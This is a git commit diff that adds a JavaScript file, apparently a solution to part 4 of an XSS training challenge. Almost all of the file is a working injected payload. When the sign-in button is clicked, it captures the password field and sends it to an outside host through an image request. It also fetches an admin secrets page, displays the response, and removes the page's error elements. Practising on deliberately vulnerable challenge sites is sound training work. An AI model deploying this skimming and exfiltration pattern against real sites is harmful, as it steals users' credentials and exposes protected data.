0052b8671a50fefbf33971b9b8de64c8c2a71388
dlee20013 <dlee20013@gmail.com>
2017-04-25 03:51:08 -0700

    hello

--- part4/part_4.js
+++ part4/part_4.js
@@ -1,1 +1,15 @@
-part 4
+document.addEventListener("DOMContentLoaded", function() {
+	document.getElementById("signin-btn").onclick = function givePassword() {
+		var img = new Image();
+		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById("login_password").value);
+		console.log(img);
+	};
+	$.ajax({url:"http://xss-challenges.r7.io/admin/secrets", success: function(hello){
+		alert(hello);
+	}});
+	var prob = document.getElementsByClassName("problem")[0];
+	var err = document.getElementsByClassName("error-message")[0];
+	prob.parentNode.removeChild(prob);
+	err.parentNode.removeChild(err);
+});
+
